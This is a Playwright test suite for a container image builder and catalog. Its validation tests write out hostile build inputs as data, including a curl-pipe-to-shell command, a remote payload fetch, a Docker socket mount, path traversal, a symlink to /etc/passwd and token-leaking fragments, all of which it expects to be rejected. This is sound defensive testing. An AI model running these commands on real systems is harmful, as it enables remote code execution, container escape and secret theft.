import {
  test,
  expect,
  request as playwrightRequest,
  type APIRequestContext,
} from "@playwright/test";
import { ApiClient } from "../helpers/api-client";
import { cleanupWorker } from "../helpers/worker-lifecycle";
import {
  createTestUser,
  deleteTestUser,
  type CreatedUser,
} from "../helpers/test-users";

const BASE_URL = process.env.BASE_URL || "http://localhost:3000";
const EMPTY_AUTH = {
  baseURL: BASE_URL,
  extraHTTPHeaders: { Origin: BASE_URL },
  storageState: { cookies: [], origins: [] },
};
const SECRET = "IMAGE_BUILD_MUST_NEVER_LEAK_THIS_TOKEN";

async function waitForBuild(
  ctx: APIRequestContext,
  id: string,
  timeout = 120_000,
) {
  const started = Date.now();
  const phases = new Set<string>();
  while (Date.now() - started < timeout) {
    const res = await ctx.get(`/api/image-builds/${id}`);
    expect(res.status()).toBe(200);
    const build = await res.json();
    if (build.phase) phases.add(build.phase);
    if (["succeeded", "failed", "cancelled"].includes(build.status))
      return { ...build, observedPhases: [...phases] };
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  throw new Error(`Image build ${id} did not finish`);
}

async function createDefinition(
  ctx: APIRequestContext,
  suffix: string,
  overrides: Record<string, unknown> = {},
) {
  const res = await ctx.post("/api/image-catalog/definitions", {
    data: {
      name: `toolchain-${suffix}`,
      description: "Fake-builder test image",
      baseImage: "agentor-worker:approved-test",
      dockerfileFragment:
        "RUN apt-get update && apt-get install -y ripgrep\nCOPY tools/config.json /opt/tools/config.json",
      contextFiles: [
        {
          path: "tools/config.json",
          contentBase64: Buffer.from('{"enabled":true}').toString("base64"),
        },
      ],
      builder: "fake",
      ...overrides,
    },
  });
  expect(res.status()).toBe(201);
  return res.json();
}

async function startBuild(
  ctx: APIRequestContext,
  definitionId: string,
  data: Record<string, unknown> = {},
) {
  const res = await ctx.post(
    `/api/image-catalog/definitions/${definitionId}/builds`,
    { data: { builder: "fake", ...data } },
  );
  expect(res.status()).toBe(202);
  return res.json();
}

test.describe.serial("Custom worker image builder and catalog", () => {
  let owner: CreatedUser;
  let ownerCtx: APIRequestContext;
  let anonymous: APIRequestContext;
  let definitionId = "";
  let promotedDigest = "";
  let promotedVersion = "";

  test.beforeAll(async () => {
    owner = await createTestUser("Image Catalog Owner");
    ownerCtx = await playwrightRequest.newContext(EMPTY_AUTH);
    expect(
      (await new ApiClient(ownerCtx).signInEmail(owner.email, owner.password))
        .status,
    ).toBe(200);
    anonymous = await playwrightRequest.newContext(EMPTY_AUTH);
    expect(
      (
        await ownerCtx.put("/api/account/env-vars", {
          data: { envVars: [{ key: "GITHUB_TOKEN", value: SECRET }] },
        })
      ).status(),
    ).toBe(200);
    const definition = await createDefinition(ownerCtx, String(Date.now()));
    definitionId = definition.id;
  });

  test.afterAll(async () => {
    await ownerCtx?.dispose();
    await anonymous?.dispose();
    if (owner) await deleteTestUser(owner.id).catch(() => {});
  });

  test("catalog and build endpoints require authentication and enforce ownership with admin visibility", async ({
    request,
  }) => {
    for (const res of await Promise.all([
      anonymous.get("/api/image-catalog/definitions"),
      anonymous.post("/api/image-catalog/definitions", { data: {} }),
      anonymous.get(`/api/image-catalog/definitions/${definitionId}`),
      anonymous.post(`/api/image-catalog/definitions/${definitionId}/builds`, {
        data: { builder: "fake" },
      }),
    ]))
      expect(res.status()).toBe(401);

    const other = await createTestUser("Image Catalog Other");
    const otherCtx = await playwrightRequest.newContext(EMPTY_AUTH);
    try {
      expect(
        (await new ApiClient(otherCtx).signInEmail(other.email, other.password))
          .status,
      ).toBe(200);
      expect(
        (
          await otherCtx.get(`/api/image-catalog/definitions/${definitionId}`)
        ).status(),
      ).toBe(403);
      expect(
        (
          await otherCtx.post(
            `/api/image-catalog/definitions/${definitionId}/builds`,
            { data: { builder: "fake" } },
          )
        ).status(),
      ).toBe(403);
    } finally {
      await otherCtx.dispose();
      await deleteTestUser(other.id);
    }

    const admin = await request.get(
      `/api/image-catalog/definitions/${definitionId}`,
    );
    expect(admin.status()).toBe(200);
    expect((await admin.json()).ownerId).toBe(owner.id);
  });

  test("definitions enforce approved Agentor bases and constrained Dockerfile operations", async () => {
    for (const [fragment, baseImage] of [
      ["RUN echo unsafe", "ubuntu:latest"],
      ["FROM ubuntu:latest", "agentor-worker:approved-test"],
      [
        "RUN --mount=type=bind,source=/var/run/docker.sock,target=/sock true",
        "agentor-worker:approved-test",
      ],
      [
        "ADD https://example.test/payload /tmp/payload",
        "agentor-worker:approved-test",
      ],
      [
        "RUN curl https://example.test/install.sh | sh",
        "agentor-worker:approved-test",
      ],
    ]) {
      const res = await ownerCtx.post("/api/image-catalog/definitions", {
        data: {
          name: `rejected-${Math.random()}`,
          baseImage,
          dockerfileFragment: fragment,
          contextFiles: [],
        },
      });
      expect(res.status(), `${baseImage}: ${fragment}`).toBe(400);
    }
  });

  test("build context rejects traversal, symlinks, oversized files, duplicate paths, and secret references", async () => {
    const cases = [
      [{ path: "../escape", contentBase64: "eA==" }],
      [{ path: "/absolute", contentBase64: "eA==" }],
      [
        {
          path: "link",
          contentBase64: "eA==",
          type: "symlink",
          linkTarget: "/etc/passwd",
        },
      ],
      [
        { path: "same", contentBase64: "eA==" },
        { path: "same", contentBase64: "eQ==" },
      ],
      [{ path: "Dockerfile", contentBase64: "eA==" }],
      [{ path: ".dockerignore", contentBase64: "eA==" }],
      [{ path: "bad.bin", size: 1, contentBase64: "not-base64" }],
    ];
    for (const contextFiles of cases) {
      const res = await ownerCtx.post("/api/image-catalog/definitions", {
        data: {
          name: `bad-context-${Math.random()}`,
          baseImage: "agentor-worker:approved-test",
          dockerfileFragment: "COPY . /opt/context",
          contextFiles,
        },
      });
      expect(res.status()).toBe(400);
    }
    const invalidContext = await ownerCtx.post(
      "/api/image-catalog/definitions",
      {
        data: {
          name: `bad-context-diagnostic-${Date.now()}`,
          baseImage: "agentor-worker:approved-test",
          dockerfileFragment: "",
          contextFiles: [{ path: "../escape", contentBase64: "eA==" }],
        },
      },
    );
    expect(invalidContext.status()).toBe(400);
    expect(await invalidContext.json()).toMatchObject({
      data: {
        code: "invalid-build-context",
        diagnostic: {
          code: "invalid-build-context",
          blockedField: "contextFiles[0].path",
          constraint: expect.any(String),
          remediation: expect.any(String),
          advancedModeAvailable: false,
          dockerAttempted: false,
        },
      },
    });
    const secretRef = await ownerCtx.post("/api/image-catalog/definitions", {
      data: {
        name: "secret-ref",
        baseImage: "agentor-worker:approved-test",
        dockerfileFragment: "ENV LEAK=$GITHUB_TOKEN",
        contextFiles: [],
      },
    });
    expect(secretRef.status()).toBe(400);
    const secretMetadata = await ownerCtx.post(
      "/api/image-catalog/definitions",
      {
        data: {
          name: `metadata-${Date.now()}`,
          description: `TOKEN=${SECRET}`,
          baseImage: "agentor-worker:approved-test",
          dockerfileFragment: "RUN true",
          contextFiles: [],
        },
      },
    );
    expect(secretMetadata.status()).toBe(400);
  });

  test("structured provisioning renders packages, commands, and context scripts without retaining secrets", async () => {
    const response = await ownerCtx.post("/api/image-catalog/definitions", {
      data: {
        name: `structured-${Date.now()}`,
        baseImage: "agentor-worker:approved-test",
        dockerfileFragment: "",
        contextFiles: [
          {
            path: "setup.sh",
            contentBase64: Buffer.from("echo configured").toString("base64"),
            role: "script",
            destination: "/opt/agentor-context/setup.sh",
          },
        ],
        provisioning: [
          { type: "packages", manager: "apt", packages: ["jq=1.7.1-3"] },
          { type: "command", command: "mkdir -p /opt/example" },
          { type: "script", path: "setup.sh", interpreter: "bash" },
        ],
      },
    });
    expect(response.status()).toBe(201);
    expect(await response.json()).toMatchObject({
      provisioning: expect.arrayContaining([
        expect.objectContaining({ type: "packages" }),
        expect.objectContaining({ type: "script", path: "setup.sh" }),
      ]),
      contextFiles: [
        expect.objectContaining({
          role: "script",
          destination: "/opt/agentor-context/setup.sh",
        }),
      ],
    });
    const runtimeTemplate = await ownerCtx.post(
      "/api/image-catalog/definitions",
      {
        data: {
          name: `template-${Date.now()}`,
          baseImage: "agentor-worker:approved-test",
          dockerfileFragment: "",
          provisioning: [],
          contextFiles: [
            {
              path: "launch.sh",
              contentBase64: Buffer.from("echo $TAVILY_API_KEY").toString(
                "base64",
              ),
            },
          ],
        },
      },
    );
    expect(runtimeTemplate.status()).toBe(201);
    for (const definition of [
      {
        provisioning: [{ type: "command", command: `echo ${SECRET}` }],
        contextFiles: [],
      },
      {
        provisioning: [{ type: "command", command: "echo ok\nUSER root" }],
        contextFiles: [],
      },
      {
        provisioning: [],
        contextFiles: [
          {
            path: "secret.txt",
            contentBase64: Buffer.from(`TOKEN=${SECRET}`).toString("base64"),
          },
        ],
      },
      {
        provisioning: [],
        contextFiles: [
          {
            path: "key.pem",
            contentBase64: Buffer.from(
              "-----BEGIN PRIVATE KEY-----\nabc",
            ).toString("base64"),
          },
        ],
      },
      {
        provisioning: [],
        contextFiles: [
          {
            path: "escape.txt",
            contentBase64: "eA==",
            destination: "/opt/agentor-context/../escape.txt",
          },
        ],
      },
      {
        provisioning: [
          {
            type: "packages",
            manager: "apt",
            packages: ["--allow-unauthenticated"],
          },
        ],
        contextFiles: [],
      },
    ]) {
      const rejected = await ownerCtx.post("/api/image-catalog/definitions", {
        data: {
          name: `structured-reject-${Math.random()}`,
          baseImage: "agentor-worker:approved-test",
          dockerfileFragment: "",
          ...definition,
        },
      });
      expect(rejected.status()).toBe(400);
    }
    const safeBlocked = await ownerCtx.post("/api/image-catalog/definitions", {
      data: {
        name: `safe-diagnostic-${Date.now()}`,
        baseImage: "agentor-worker:approved-test",
        dockerfileFragment: "",
        contextFiles: [],
        provisioning: [{ type: "command", command: "echo first\necho second" }],
      },
    });
    expect(safeBlocked.status()).toBe(400);
    expect(await safeBlocked.json()).toMatchObject({
      statusMessage: expect.stringContaining("Blocked by Safe mode"),
      data: {
        code: "safe-mode-blocked",
        diagnostic: {
          code: "safe-mode-blocked",
          blockedField: "provisioning[0]",
          blockedStep: { index: 0, type: "command" },
          constraint: expect.any(String),
          reason: expect.stringContaining("Agentor"),
          remediation: expect.any(String),
          advancedModeAvailable: true,
          advancedModeWarning: expect.stringContaining(
            "controlled Docker/BuildKit",
          ),
          dockerAttempted: false,
        },
      },
    });
  });

  test("Advanced provisioning executes multiline shell inside the controlled build without Dockerfile control", async () => {
    const created = await createDefinition(ownerCtx, `advanced-${Date.now()}`, {
      baseImage: "agentor-worker:approved-default",
      dockerfileFragment: "",
      contextFiles: [],
      provisioningMode: "advanced",
      provisioning: [
        {
          type: "command",
          command:
            "printf '%s\\n' advanced > /tmp/agentor-advanced-proof\nUSER root\ntest -f /tmp/agentor-advanced-proof",
        },
      ],
    });
    try {
      const result = await waitForBuild(
        ownerCtx,
        (
          await startBuild(ownerCtx, created.id, {
            builder: "controlled",
            requestId: `advanced-controlled-${Date.now()}`,
          })
        ).id,
      );
      expect(result).toMatchObject({
        status: "succeeded",
        outcome: "ready",
        dockerAttempted: true,
        imageCreated: true,
        compatibility: { coreState: "passed" },
      });
    } finally {
      await ownerCtx.delete(`/api/image-catalog/definitions/${created.id}`);
    }
  });

  test("asynchronous build exposes phases and redacted live logs then records immutable digest and version", async () => {
    const created = await startBuild(ownerCtx, definitionId, {
      fakeDurationMs: 1000,
      requestId: `rest-build-${Date.now()}`,
    });
    expect(created).toMatchObject({
      status: expect.stringMatching(/queued|running/),
      definitionId,
    });
    const retried = await startBuild(ownerCtx, definitionId, {
      fakeDurationMs: 1000,
      requestId: created.requestId,
    });
    expect(retried.id).toBe(created.id);
    const logsWhileRunning = await ownerCtx.get(
      `/api/image-builds/${created.id}/logs?after=0`,
    );
    expect(logsWhileRunning.status()).toBe(200);
    expect(await logsWhileRunning.text()).not.toContain(SECRET);

    const build = await waitForBuild(ownerCtx, created.id);
    expect(build.status).toBe("succeeded");
    const recentBuilds = await ownerCtx.get("/api/image-builds");
    expect(recentBuilds.status()).toBe(200);
    expect(
      (await recentBuilds.json()).filter((item: any) => item.id === created.id),
    ).toHaveLength(1);
    expect(build.observedPhases).toEqual(
      expect.arrayContaining(["validating", "building"]),
    );
    expect(build.durationMs).toBeGreaterThanOrEqual(0);
    expect(build.digest).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(build.version).toBeTruthy();
    expect(build.ownerId).toBe(owner.id);
    expect(JSON.stringify(build)).not.toContain(SECRET);
    const firstLogPage = await ownerCtx.get(
      `/api/image-builds/${created.id}/logs?after=0&limit=1`,
    );
    expect(firstLogPage.status()).toBe(200);
    const firstLogPageBody = await firstLogPage.json();
    expect(firstLogPageBody).toMatchObject({
      after: 0,
      entries: [expect.any(String)],
      nextAfter: 1,
      nextCursor: 1,
    });
    const nextLogPage = await ownerCtx.get(
      `/api/image-builds/${created.id}/logs?after=${firstLogPageBody.nextCursor}&limit=1`,
    );
    expect(nextLogPage.status()).toBe(200);
    const nextLogPageBody = await nextLogPage.json();
    expect(nextLogPageBody).toMatchObject({
      after: 1,
      entries: [expect.any(String)],
    });
    expect(nextLogPageBody.entries).not.toEqual(firstLogPageBody.entries);
    promotedDigest = build.digest;
    promotedVersion = build.version;

    const definition = await ownerCtx.get(
      `/api/image-catalog/definitions/${definitionId}`,
    );
    const saved = await definition.json();
    expect(saved.versions).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          version: promotedVersion,
          digest: promotedDigest,
        }),
      ]),
    );
    expect(
      saved.versions.find((entry: any) => entry.version === promotedVersion)
        .digestMutable,
    ).not.toBe(true);
  });

  test("active build cancellation is terminal and removes partial artifacts", async () => {
    const created = await startBuild(ownerCtx, definitionId, {
      fakeDurationMs: 10_000,
    });
    const cancel = await ownerCtx.delete(`/api/image-builds/${created.id}`);
    expect(cancel.status()).toBe(200);
    expect((await cancel.json()).status).toBe("cancelled");
    expect((await waitForBuild(ownerCtx, created.id)).status).toBe("cancelled");
    const usage = await ownerCtx.get("/api/image-catalog/usage");
    expect((await usage.json()).partialBuildBytes).toBe(0);
  });

  test("failure is safe and restart recovery marks interrupted work without leaking internals", async () => {
    expect(
      (
        await ownerCtx.post("/api/image-builder/fake/faults", {
          data: {
            failPhase: "building",
            message: `internal ${SECRET} /var/run/docker.sock`,
          },
        })
      ).status(),
    ).toBe(200);
    const failed = await waitForBuild(
      ownerCtx,
      (await startBuild(ownerCtx, definitionId)).id,
    );
    expect(failed.status).toBe("failed");
    expect(failed.error).toBeTruthy();
    expect(failed.error).not.toMatch(/TOKEN|docker\.sock|stack|\/var\//i);
    const logs = await ownerCtx.get(`/api/image-builds/${failed.id}/logs`);
    expect(await logs.text()).not.toContain(SECRET);

    const interrupted = await startBuild(ownerCtx, definitionId, {
      fakePauseUntilRestart: true,
    });
    const recovery = await ownerCtx.post(
      "/api/image-builder/fake/simulate-restart",
    );
    expect(recovery.status()).toBe(200);
    const recovered = await waitForBuild(ownerCtx, interrupted.id);
    expect(recovered.status).toMatch(/failed|queued/);
    expect(recovered.recovery).toBeTruthy();
  });

  test("unconfigured approved base aliases are rejected synchronously before a Docker job is created", async () => {
    const unavailable = await createDefinition(
      ownerCtx,
      `unavailable-${Date.now()}`,
      {
        baseImage: `agentor-worker:approved-unconfigured-${Date.now()}`,
        dockerfileFragment: "RUN true",
        contextFiles: [],
      },
    );
    const buildsBefore = await ownerCtx.get("/api/image-builds");
    expect(buildsBefore.status()).toBe(200);
    const beforeIds = new Set(
      (await buildsBefore.json()).map((build: any) => build.id),
    );
    const rejected = await ownerCtx.post(
      `/api/image-catalog/definitions/${unavailable.id}/builds`,
      { data: { builder: "controlled" } },
    );
    expect(rejected.status()).toBe(400);
    expect(await rejected.json()).toMatchObject({
      statusMessage: expect.stringContaining(
        "Approved image base is unavailable",
      ),
      data: {
        code: "invalid-definition",
        diagnostic: {
          code: "invalid-definition",
          blockedField: "baseImage",
          dockerAttempted: false,
          advancedModeAvailable: false,
          remediation: expect.any(String),
        },
      },
    });
    const buildsAfter = await ownerCtx.get("/api/image-builds");
    expect(buildsAfter.status()).toBe(200);
    expect(
      (await buildsAfter.json()).filter(
        (build: any) => !beforeIds.has(build.id),
      ),
    ).toEqual([]);
    const invalidAlias = await ownerCtx.post(
      `/api/image-catalog/definitions/${definitionId}/rebuild-base`,
      { data: { builder: "fake", baseImage: "ubuntu:latest" } },
    );
    expect(invalidAlias.status()).toBe(400);
    expect(await invalidAlias.json()).toMatchObject({
      data: {
        code: "invalid-definition",
        diagnostic: {
          blockedField: "baseImage",
          dockerAttempted: false,
          constraint: expect.stringContaining("agentor-worker:approved-*"),
        },
      },
    });
    const buildsAfterInvalidAlias = await ownerCtx.get("/api/image-builds");
    expect(
      (await buildsAfterInvalidAlias.json()).filter(
        (build: any) => !beforeIds.has(build.id),
      ),
    ).toEqual([]);
  });

  test("promotion, test worker, rollback, and image selection use immutable catalog versions", async () => {
    const fakeTestWorker = await ownerCtx.post(
      `/api/image-catalog/definitions/${definitionId}/versions/${promotedVersion}/test-worker`,
      { data: { displayName: "image-smoke-test" } },
    );
    expect(fakeTestWorker.status()).toBe(409);

    const runnableDefinition = await createDefinition(
      ownerCtx,
      `runnable-${Date.now()}`,
      {
        baseImage: "agentor-worker:approved-default",
        dockerfileFragment:
          "RUN printf catalog-smoke-test > /opt/agentor-image-smoke",
        contextFiles: [],
      },
    );
    const controlledStart = await ownerCtx.post(
      `/api/image-catalog/definitions/${runnableDefinition.id}/builds`,
      { data: { builder: "controlled" } },
    );
    expect(controlledStart.status()).toBe(202);
    const controlled = await waitForBuild(
      ownerCtx,
      (await controlledStart.json()).id,
    );
    expect(controlled.status).toBe("succeeded");
    expect(controlled.baseDigest).toMatch(/^sha256:[0-9a-f]{64}$/);
    const pinnedDefinition = await (
      await ownerCtx.get(
        `/api/image-catalog/definitions/${runnableDefinition.id}`,
      )
    ).json();
    expect(pinnedDefinition.baseImage).toBe("agentor-worker:approved-default");
    expect(pinnedDefinition.versions[0]).toMatchObject({
      baseImage: "agentor-worker:approved-default",
      baseDigest: controlled.baseDigest,
    });
    const testWorker = await ownerCtx.post(
      `/api/image-catalog/definitions/${runnableDefinition.id}/versions/${controlled.version}/test-worker`,
      {
        data: {
          displayName: "image-smoke-test",
          requestId: `test-worker-${Date.now()}`,
        },
      },
    );
    expect(testWorker.status()).toBe(202);
    const acceptedTestWorker = await testWorker.json();
    expect(acceptedTestWorker).toMatchObject({
      id: expect.any(String),
      operation: "test-worker",
      digest: controlled.digest,
      status: expect.stringMatching(/queued|running/),
      requestId: expect.stringMatching(/^test-worker-/),
    });
    const actualTestWorker = await waitForBuild(
      ownerCtx,
      acceptedTestWorker.id,
    );
    expect(actualTestWorker).toMatchObject({
      status: "succeeded",
      outcome: "test-worker-ready",
      workerId: expect.any(String),
    });
    const workers = await ownerCtx.get("/api/containers");
    expect(
      (await workers.json()).some(
        (worker: any) =>
          worker.id === actualTestWorker.workerId &&
          worker.imageDigest === controlled.digest,
      ),
    ).toBe(true);
    const realUsage = await ownerCtx.get("/api/image-catalog/usage");
    expect(
      (await realUsage.json()).definitions.find(
        (item: any) => item.id === runnableDefinition.id,
      ).bytes,
    ).toBeGreaterThan(0);
    await cleanupWorker(ownerCtx, actualTestWorker.workerId);

    const promotion = await ownerCtx.post(
      `/api/image-catalog/definitions/${definitionId}/versions/${promotedVersion}/promote`,
    );
    expect(promotion.status()).toBe(200);
    expect((await promotion.json()).promotedDigest).toBe(promotedDigest);

    const create = await ownerCtx.post("/api/containers", {
      data: {
        displayName: "catalog-selected-worker",
        imageDefinitionId: definitionId,
        imageVersion: promotedVersion,
      },
    });
    expect(create.status()).toBe(201);
    const worker = await create.json();
    expect(worker.imageId || worker.imageDigest).toContain(
      promotedDigest.replace("sha256:", ""),
    );
    await cleanupWorker(ownerCtx, worker.id);

    const rollback = await ownerCtx.post(
      `/api/image-catalog/definitions/${definitionId}/rollback`,
      { data: { version: promotedVersion } },
    );
    expect(rollback.status()).toBe(200);
    expect((await rollback.json()).promotedDigest).toBe(promotedDigest);
  });

  test("user and system defaults are distinct, authorized, and preserve existing-worker compatibility", async ({
    request,
  }) => {
    const userDefault = await ownerCtx.put("/api/image-catalog/defaults", {
      data: { definitionId, version: promotedVersion },
    });
    expect(userDefault.status()).toBe(200);
    expect(await userDefault.json()).toMatchObject({
      source: "user",
      digest: promotedDigest,
    });

    const deniedSystem = await ownerCtx.put(
      "/api/image-catalog/defaults/system",
      { data: { definitionId, version: promotedVersion } },
    );
    expect(deniedSystem.status()).toBe(403);
    const systemDefault = await request.put(
      "/api/image-catalog/defaults/system",
      { data: { definitionId, version: promotedVersion } },
    );
    expect(systemDefault.status()).toBe(200);

    const effective = await ownerCtx.get(
      "/api/image-catalog/defaults/effective",
    );
    expect(await effective.json()).toMatchObject({
      source: "user",
      digest: promotedDigest,
    });
    const legacy = await ownerCtx.post("/api/containers", {
      data: { displayName: "legacy-default-compatible" },
    });
    expect(legacy.status()).toBe(201);
    const legacyWorker = await legacy.json();
    expect(legacyWorker.imageName).toBeTruthy();
    await cleanupWorker(ownerCtx, legacyWorker.id);
  });

  test("rebuild against a newer approved base creates a new version without mutating the old digest", async () => {
    const rebuild = await ownerCtx.post(
      `/api/image-catalog/definitions/${definitionId}/rebuild-base`,
      {
        data: { baseImage: "agentor-worker:approved-test-v2", builder: "fake" },
      },
    );
    expect(rebuild.status()).toBe(202);
    const result = await waitForBuild(ownerCtx, (await rebuild.json()).id);
    expect(result.status).toBe("succeeded");
    expect(result.digest).not.toBe(promotedDigest);
    const definition = await ownerCtx.get(
      `/api/image-catalog/definitions/${definitionId}`,
    );
    const versions = (await definition.json()).versions;
    expect(versions).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          version: promotedVersion,
          digest: promotedDigest,
        }),
        expect.objectContaining({
          digest: result.digest,
          baseImage: "agentor-worker:approved-test-v2",
        }),
      ]),
    );

    const beforeFailure = await (
      await ownerCtx.get(`/api/image-catalog/definitions/${definitionId}`)
    ).json();
    const unavailable = await ownerCtx.post(
      `/api/image-catalog/definitions/${definitionId}/rebuild-base`,
      {
        data: {
          baseImage: "agentor-worker:approved-unavailable",
          builder: "controlled",
        },
      },
    );
    expect(unavailable.status()).toBe(400);
    expect(await unavailable.json()).toMatchObject({
      data: {
        code: "invalid-definition",
        diagnostic: { blockedField: "baseImage", dockerAttempted: false },
      },
    });
    const afterFailure = await (
      await ownerCtx.get(`/api/image-catalog/definitions/${definitionId}`)
    ).json();
    expect(afterFailure.baseImage).toBe(beforeFailure.baseImage);

    const [first, second] = await Promise.all([
      startBuild(ownerCtx, definitionId, { fakeDurationMs: 500 }),
      startBuild(ownerCtx, definitionId, { fakeDurationMs: 500 }),
    ]);
    const [firstDone, secondDone] = await Promise.all([
      waitForBuild(ownerCtx, first.id),
      waitForBuild(ownerCtx, second.id),
    ]);
    expect(firstDone.status).toBe("succeeded");
    expect(secondDone.status).toBe("succeeded");
    expect(firstDone.version).not.toBe(secondDone.version);
  });

  test("layer cache, usage accounting, failed cleanup, and deletion protect referenced versions", async () => {
    const cached = await waitForBuild(
      ownerCtx,
      (await startBuild(ownerCtx, definitionId)).id,
    );
    expect(cached.cache).toMatchObject({
      enabled: true,
      hits: expect.any(Number),
    });
    expect(cached.cache.hits).toBeGreaterThan(0);

    const usage = await ownerCtx.get("/api/image-catalog/usage");
    expect(usage.status()).toBe(200);
    expect(await usage.json()).toMatchObject({
      totalBytes: expect.any(Number),
      definitions: expect.any(Array),
      partialBuildBytes: 0,
    });
    const prune = await ownerCtx.post("/api/image-catalog/cleanup", {
      data: { failedBuilds: true, unusedArtifacts: true },
    });
    expect(prune.status()).toBe(200);
    expect(await prune.json()).toMatchObject({
      partialArtifactsRemoved: expect.any(Number),
      unusedVersionsRemoved: expect.any(Number),
      bytesReclaimed: expect.any(Number),
    });

    const referenced = await ownerCtx.delete(
      `/api/image-catalog/definitions/${definitionId}/versions/${promotedVersion}`,
    );
    expect(referenced.status()).toBe(409);
    const definitionDelete = await ownerCtx.delete(
      `/api/image-catalog/definitions/${definitionId}`,
    );
    expect(definitionDelete.status()).toBe(409);
  });

  test("definition deletion waits for an active build, then permits cleanup after cancellation", async () => {
    const transient = await createDefinition(ownerCtx, "active-delete");
    const build = await startBuild(ownerCtx, transient.id, {
      fakeDurationMs: 10_000,
    });

    const whileBuilding = await ownerCtx.delete(
      `/api/image-catalog/definitions/${transient.id}`,
    );
    expect(whileBuilding.status()).toBe(409);

    const cancelled = await ownerCtx.delete(`/api/image-builds/${build.id}`);
    expect(cancelled.status()).toBe(200);
    expect((await cancelled.json()).status).toBe("cancelled");

    const deleted = await ownerCtx.delete(
      `/api/image-catalog/definitions/${transient.id}`,
    );
    expect(deleted.status()).toBe(204);
    expect(
      (
        await ownerCtx.get(`/api/image-catalog/definitions/${transient.id}`)
      ).status(),
    ).toBe(404);
  });

  test("definition start and deletion are atomic against one another", async () => {
    for (let attempt = 0; attempt < 5; attempt++) {
      const transient = await createDefinition(
        ownerCtx,
        `atomic-delete-${attempt}`,
      );
      const [deletion, start] = await Promise.all([
        ownerCtx.delete(`/api/image-catalog/definitions/${transient.id}`),
        ownerCtx.post(`/api/image-catalog/definitions/${transient.id}/builds`, {
          data: { builder: "fake", fakeDurationMs: 200 },
        }),
      ]);
      expect(
        [deletion.status(), start.status()].filter((status) =>
          [200, 202, 204].includes(status),
        ),
      ).toHaveLength(1);
      expect([409, 404]).toContain(
        deletion.status() >= 400 ? deletion.status() : start.status(),
      );
      if (start.status() === 202) {
        const build = await start.json();
        await ownerCtx.delete(`/api/image-builds/${build.id}`);
        expect(
          (
            await ownerCtx.delete(
              `/api/image-catalog/definitions/${transient.id}`,
            )
          ).status(),
        ).toBe(204);
      }
    }
  });

  test("builder diagnostics prove no raw Docker socket, host execution, account secrets, or persisted build secrets", async () => {
    const diagnostics = await ownerCtx.get("/api/image-builder/diagnostics");
    expect(diagnostics.status()).toBe(200);
    const text = await diagnostics.text();
    expect(text).not.toContain(SECRET);
    expect(text).not.toMatch(
      /\/var\/run\/docker\.sock|HostConfig|Privileged.*true|account.*env|GITHUB_TOKEN/i,
    );
    const info = JSON.parse(text);
    expect(info).toMatchObject({
      boundary: expect.stringMatching(/buildkit|controlled|fake/),
      rawDockerSocket: false,
      secretsInContext: false,
    });

    const definition = await ownerCtx.get(
      `/api/image-catalog/definitions/${definitionId}`,
    );
    expect(await definition.text()).not.toContain(SECRET);
    const logs = await ownerCtx.get(
      `/api/image-catalog/definitions/${definitionId}/logs`,
    );
    expect(await logs.text()).not.toContain(SECRET);
  });
});
